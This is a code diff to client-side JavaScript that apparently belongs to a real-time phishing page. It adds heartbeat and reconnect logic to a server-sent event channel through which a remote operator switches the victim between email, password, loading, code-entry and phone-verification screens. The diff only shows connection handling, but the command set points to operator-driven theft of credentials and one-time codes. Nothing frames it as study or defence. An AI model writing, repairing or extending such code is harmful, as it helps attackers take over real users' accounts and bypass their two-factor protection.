@@ -91,82 +91,79 @@ const clientId = getClientId();
 
 
 let eventSource;
+let heartbeatInterval;
+let lastHeartbeat = Date.now();
+const HEARTBEAT_CHECK_INTERVAL = 30000; // 30 seconds
 
 function connectEventSource() {
-    //eventSource = new EventSource(`/events?clientId=${clientId}&currPage=${currPage}`);
-	console.log("eventSource req");
+    eventSource = new EventSource(`/events?clientId=${clientId}&currPage=${currPage}`);
+    
     eventSource.onopen = function(event) {
         console.log('Connection opened');
+        lastHeartbeat = Date.now(); // Reset the heartbeat timestamp
     };
 
-    //This is for reconnection purposes 
     eventSource.onmessage = function(event) {
         console.log('Message received: ', event.data);
-        const data = JSON.parse(event.data);
-  console.log(data);
+        lastHeartbeat = Date.now(); // Update the heartbeat timestamp
 
-  if (data.type === 'command') {
-    switch(data.command) {
-      case 'emailScreen':
-        loginScreen();
-        break;
-      case 'passwordScreen':
-        passwordScreen();
-        break;
-      case 'loadScreen':
-        showLoading();
-        break;
-      case 'codePage':
-        window.location.href = "/code";
-        break;
-      case 'verifyPhone':
-        window.location.href = "/phone";
-        break;
-      case 'loadPage':
-        window.location.href = "/load";
-        break;  
-    }
-  }
+        const data = JSON.parse(event.data);
+        console.log(data);
+
+        if (data.type === 'command') {
+            switch(data.command) {
+                case 'emailScreen':
+                    loginScreen();
+                    break;
+                case 'passwordScreen':
+                    passwordScreen();
+                    break;
+                case 'loadScreen':
+                    showLoading();
+                    break;
+                case 'codePage':
+                    window.location.href = "/code";
+                    break;
+                case 'verifyPhone':
+                    window.location.href = "/phone";
+                    break;
+                case 'loadPage':
+                    window.location.href = "/load";
+                    break;  
+            }
+        }
     };
-    
+
+    eventSource.onerror = function(error) {
+        console.error('EventSource failed:', error);
+        reconnectEventSource();
+    };
+
+    // Start the heartbeat check
+    startHeartbeatCheck();
 }
 
-
-eventSource = new EventSource(`/events?clientId=${clientId}&currPage=${currPage}`);
-
-eventSource.onmessage = function(event) {
-  const data = JSON.parse(event.data);
-  console.log(data);
-
-  if (data.type === 'command') {
-    switch(data.command) {
-      case 'emailScreen':
-        loginScreen();
-        break;
-      case 'passwordScreen':
-        passwordScreen();
-        break;
-      case 'loadScreen':
-        showLoading();
-        break;
-      case 'codePage':
-        window.location.href = "/code";
-        break;
-      case 'verifyPhone':
-        window.location.href = "/phone";
-        break;
-      case 'loadPage':
-        window.location.href = "/load";
-        break;  
+function reconnectEventSource() {
+    // Close the existing connection if it's open
+    if (eventSource) {
+        eventSource.close();
     }
-  }
-};
-    
-    
-    eventSource.onerror = function(error) {
-      console.error('EventSource failed:', error);
-      connectEventSource();
-    };
+    // Reconnect after a short delay
+    setTimeout(connectEventSource, 1000);
+}
+
+function startHeartbeatCheck() {
+    clearInterval(heartbeatInterval); // Clear any existing interval
+    heartbeatInterval = setInterval(() => {
+        if (Date.now() - lastHeartbeat > HEARTBEAT_CHECK_INTERVAL) {
+            console.warn('No heartbeat detected, reconnecting...');
+            reconnectEventSource();
+        }
+    }, HEARTBEAT_CHECK_INTERVAL);
+}
+
+// Initial connection
+connectEventSource();
     
     
     function sendInput(data, redirectUrl = null) {
